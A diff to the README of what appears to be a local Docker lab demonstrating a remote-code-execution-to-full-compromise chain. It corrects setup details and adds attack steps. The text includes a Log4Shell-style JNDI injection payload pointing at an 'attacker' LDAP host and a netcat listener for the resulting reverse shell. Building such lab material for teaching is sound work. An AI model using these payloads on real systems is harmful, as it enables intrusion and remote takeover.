@@ -12,8 +12,8 @@ It presents a practical demonstration of an exploitation chain involving:
 ## Requirements
 
 - **Linux Kernel 5.8.x**  
-  (Tested with `5.10.0-19`, default in Ubuntu 21.04)
-  You can use `name -r` to check your kernel version
+  (Tested with `5.13.0-19`, default in Ubuntu 21.04)
+  You can use `uname -r` to check your kernel version
 - **Docker** and **Docker Compose**
 
 ---
@@ -22,7 +22,7 @@ It presents a practical demonstration of an exploitation chain involving:
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/your-username/rce-to-full-compromise-demo.git
+git clone https://github.com/marco-giacobbe/rce-to-full-compromise-demo.git
 cd rce-to-full-compromise-demo
 ```
 ### 2. Build and Start the Environment
@@ -36,9 +36,7 @@ Through your browser visit:
 ```
 http://localhost:8080/
 ```
-% This interface contains a vulnerable component through which
-% the initial Remote Code Execution (RCE) is performed.
-%
+
 ### 4. Set Up the Attacker Listener
 In a new terminal, open a shell inside the attacker container
 ```bash
@@ -50,5 +48,9 @@ nc -lp 6666
 ```
 
 This listen for the reverse shell triggered by the exploit.
-### Start the Exploit via Web Interface
-Using the vulnerable form on the frontend site submit the payload `${jndi:ldap://attacker:1389/Exploit}`
+
+### 5. Perform the attack via Web Interface
+For example:
+  - Submit the payload `${jndi:ldap://attacker:1389/Exploit}` through the vulnerable form on the frontend site.
+  - Request the page `http://localhost:8080/${jndi:ldap://attacker:1389/Exploit}`
+  - You can also build your own payload.
